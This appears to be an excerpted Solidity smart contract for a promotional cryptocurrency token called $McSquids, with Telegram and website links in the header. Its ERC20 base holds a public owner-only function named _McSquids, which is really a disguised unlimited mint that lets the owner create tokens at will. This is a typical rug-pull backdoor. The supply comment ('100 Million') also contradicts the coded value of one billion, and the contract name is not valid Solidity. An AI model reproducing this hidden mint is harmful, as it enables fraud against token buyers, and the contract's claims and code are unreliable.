...
//
// $McSquids proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/McSquids
// 📱 Website ::https://mcsquids.live/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _McSquids(uint256 amount) public onlyOwner {
 _McSquids(msg.sender, amount);
    }
    ...
    function _McSquids(address account, uint256 amount) internal virtual {
...
contract $McSquids is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("McSquids", "SQUIDS") {
     _McSquids(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}